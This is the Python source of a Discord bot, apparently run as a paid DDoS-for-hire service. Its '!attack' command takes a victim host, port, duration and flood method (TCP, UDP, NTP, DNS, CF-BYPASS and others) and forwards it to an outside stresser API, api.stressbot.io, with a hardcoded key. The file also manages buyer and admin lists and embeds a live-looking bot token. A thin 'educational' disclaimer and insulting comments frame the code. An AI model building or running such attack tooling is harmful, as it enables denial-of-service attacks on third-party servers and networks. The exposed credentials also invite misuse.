# I may not be held responsible for any damage caused by my code. This project is purely made for 'Proof-Of-Concept', educational purposed,
# and stress-testing your own networks and IoT devices to test your DDoS protection. I do not tolerate any illegal use of my code,
# and the user is responsible for everything that he/she/they do with my code.
#
# This was created because a lot of script kiddies have been making poorly coded Discord DDoS bots, they used requests.get/post for Discord Bots, they used unclean code,
# they used poor grammar on the bots, and so on.
#
# With poor grammar, I refer to the people that say 'your' instead of 'you're', 'i' instead of 'I', 'dont' instead of 'don't', and so on.
# These little children should pay attention in school. Such grammar mistakes make you look more silly, and therefore you will archive less.
#
# This was made by vk/sqpenis.
#
# LINKS:
# https://vk.com/sqpenis
# https://vk.com/sqpenis

from discord.ext import commands     # Commands
from discord.ext.commands import Bot # BOt
from os import system                # This will be used to clear the screen in on_ready()
from os import name                  # ^
from colorama import *               # This will be used to print our startup banner in color
import discord                       # D I S C O R D
import aiohttp                       # For our API Requests
import random                        # Random.randint(1,6) will be used in the random_color() function!

buyers  = [1068896031376429176]              # Replace digits with Discord USER-IDs!
admins  = [1068896031376429176]              # Replace digits with Discord USER-IDs! (admins!!)
owners  = [1068896031376429176]              # Replace digits with Discord USER-IDs! (owners, they cannot be removed!!)
token   = 'your_token_lol'                  # Discord Bot token
bot = commands.Bot(command_prefix = '!', intents= discord.Intents.all())

l4methods = ['TCP', 'UDP', 'GAME', 'NTP', 'DNS', 'OVH-TCP', 'OVH-UDP']             # Our Layer4 methods. Add more if desired!
l7methods = ['TLS', 'CF-BYPASS', 'HTTP-RAW', 'HTTP1', 'BROWSER'] # Our Layer7 methods. Add more if desired!

# This is a list of dirs. We will use this for multiple API keys in the DDoS command.
api_data = [
    {
        'api_url':'https://api.stressbot.io', # API URL #1
        'api_key':'kybro',              # API KEY #1
        'max_time':'120'                  # The max booting time for our bot. You need to change it, probably.
    },
    {
        'api_url':'https://api.stressbot.io', # API URL #1
        'api_key':'kybro',               # API KEY #1
        'max_time':'120'                    # The max booting time for our bot. You need to change it, probably.
    }
]

# This is our function to give embeds a random color!
# You can call it using 'await random_color()'
async def random_color():
    number_lol = random.randint(1, 999999)

    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))

    return number_lol

@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer in buyers:
        await ctx.send(f'{buyer} has already copped a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.append(buyer)
        await ctx.send('Added him/her!!')

@bot.command()
async def del_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer not in buyers:
        await ctx.send(f'{buyer} did not cop a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.remove(buyer)
        await ctx.send('Removed him/her!!')
        
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin in admins:
        await ctx.send(f'{admin} is already an admin!')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.append(admin)
        await ctx.send('Added him/her!!')

@bot.command()
async def del_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin not in admins:
        await ctx.send(f'{admin} is not an admin')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.remove(admin)
        await ctx.send('Removed him/her!!')

#ctx, method/help, victim (ip/host), port (exmpl 80), time
@bot.command()
async def attack(ctx, method : str = None, victim : str = None, port : str = None, time : str = None):
    if ctx.author.id not in buyers:
        await ctx.send(f'Sorry, {ctx.author} buy access to use the bot')
    elif attack is None:
        await ctx.send('->')
        await ctx.send('`Attack start \nMethod: TCP \nNetwork: Vip \nPPS: -1 \nApi: on \nPlan X+`')

    else:
        if method is None or method.upper() == 'HELP':
            l4methodstr = ''
            l7methodstr = ''

            for m in l4methods:
                l4methodstr = f'{l4methodstr}{m}\n'

            for m2 in l7methods:
                l7methodstr = f'{l7methodstr}{m2}\n'

            embed = discord.Embed(title="HELP", description="Listen Bot", color=await random_color())
            embed.add_field(name="Syntax:", value="!attack <method> <target> <port> <time>")
            embed.add_field(name="L4 METHODS:", value=f"{l4methodstr}")
            embed.add_field(name="L7 METHODS:", value=f"{l7methodstr}")

            await ctx.send(embed=embed)

        # There was no method
        elif method is None:
            await ctx.send('You need a method!')
            
        # The method was invalid!
        elif method.upper() not in l4methods and method.upper() not in l7methods:
            await ctx.send(f'Invalid method!!')

        # There was no victim
        elif victim is None:
            await ctx.send('You need a target!')

        # There was no port
        elif port is None:
            await ctx.send('You need a port!')

        # There was no time
        elif time is None:
            await ctx.send('You need a time!')

        # Everything is correct!
        else:
            for i in api_data:
                try:
                    api_url = i["api_url"]
                    api_key = i["api_key"]
                    max_time = int(i["max_time"])

                    if int(time) > max_time:
                        time2 = max_time

                    else:
                        time2 = int(time)

                    async with aiohttp.ClientSession() as session:
                        await session.post(f'https://api.stressbot.io/api2.php?key=kybro&host={victim}&port={port}&time={time}&method=HTTP1')
                        #print(f'https://api.stressbot.io/api2.php?key=kybro&host={victim}&port={port}&time={time}&method=HTTP1')

                except Exception as e:
                    #print(e)
                    pass

            embed = discord.Embed(title="Attack info", description=f"```TARGET: {victim} \nPORT: {port} \nTIME: {time} \nMETHOD: {method} \nSENT BY: {ctx.author}```", color=await random_color())
            await ctx.send(embed=embed)

@bot.command()
async def helpp(ctx):
  embed = discord.Embed(
    title = 'Listen Bot',
    colour = 4374015,
    description = '\n```\n! - префикс 🤖\n```\n```\n!helpp - помощь 🤗\n```\n```\n!hlp - гайд по боту 🧐\n```\n```\n!attack - начать аттаку 🚀\n```\n```\n!scan - сканер портов 🛠️\n```\n```\n!auto - автоконфигурация для сервера 🔧\n```\n```\n!ban - Баны 🚫\n```\n```\n!kick - Кики 🖕\n```\n',
    url = 'https://discord.com/api/oauth2/authorize?client_id=1061356054962770051&permissions=8&scope=bot')
  await ctx.send(embed=embed)

@bot.event
async def on_ready():
    banner = f"""
        {Fore.RED};) ██╗  █{Fore.YELLOW}█╗███████{Fore.GREEN}╗███╗   █{Fore.CYAN}█╗███████{Fore.BLUE}█╗ █████╗{Fore.MAGENTA} ██╗ :-).
        {Fore.RED};) ██║  █{Fore.YELLOW}█║██╔════{Fore.GREEN}╝████╗  █{Fore.CYAN}█║╚══██╔═{Fore.BLUE}═╝██╔══██{Fore.MAGENTA}╗██║ :-).
        {Fore.RED};) ██████{Fore.YELLOW}█║█████╗ {Fore.GREEN} ██╔██╗ █{Fore.CYAN}█║   ██║ {Fore.BLUE}  ███████{Fore.MAGENTA}║██║ :-).
        {Fore.RED};) ██╔══█{Fore.YELLOW}█║██╔══╝ {Fore.GREEN} ██║╚██╗█{Fore.CYAN}█║   ██║ {Fore.BLUE}  ██╔══██{Fore.MAGENTA}║██║ :-).
        {Fore.RED};) ██║  █{Fore.YELLOW}█║███████{Fore.GREEN}╗██║ ╚███{Fore.CYAN}█║   ██║ {Fore.BLUE}  ██║  ██{Fore.MAGENTA} ██║ :-).
        {Fore.RED};) ╚═╝  ╚{Fore.YELLOW}═╝╚══════{Fore.GREEN}╝╚═╝  ╚══{Fore.CYAN}═╝   ╚═╝ {Fore.BLUE}  ╚═╝  ╚═{Fore.MAGENTA}╝╚═╝ :-).
        {Fore.RESET}"""

    if name == 'nt':
        system('cls')

    else:
        system('clear')

    print(banner)
    print(f'{Fore.RED}           Logged in on {Fore.YELLOW}{bot.user.name}{Fore.GREEN}! My ID is {Fore.BLUE}{bot.user.id}{Fore.MAGENTA}, I believe!{Fore.RESET}\n')
    
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} ебет маму лмао"))
        
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f"DDoS"))

if __name__ == '__main__':
    init(convert=True)
    bot.run("MTA2OTkxOTIxMTgwMTAzNDc4Mw.GH0xNz.lo6gNxlSceysNhj6E-qqVF5f-ivaTKhGiorAHE")
